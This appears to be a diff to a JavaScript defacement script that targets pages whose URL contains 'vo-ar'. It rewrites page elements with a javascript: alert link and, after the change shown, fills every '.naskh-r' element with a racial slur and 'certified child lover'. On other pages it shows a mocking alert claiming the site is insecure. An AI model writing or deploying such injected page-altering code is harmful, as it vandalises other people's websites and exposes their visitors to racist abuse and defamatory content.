@@ -31,7 +31,7 @@ if(window.location.href.includes("vo-ar")){
     name = document.querySelector(".f-s-25");
     name.innerHTML = `<a href="javascript:alert('>_< nyaa~')" class="rainbow">Click Me :D</a>`
     document.querySelectorAll('a').forEach(el => {el.style.color='pink'})
-    document.querySelectorAll(".naskh-r").textContent = 'nigger | certified child lover'
+    document.querySelectorAll(".naskh-r").forEach(el => {el.textContent = 'nigger | certified child lover'}) 
 }
 else {
     alert("this site is not properly secured, your accounts / info may be in danger - sussy baka")
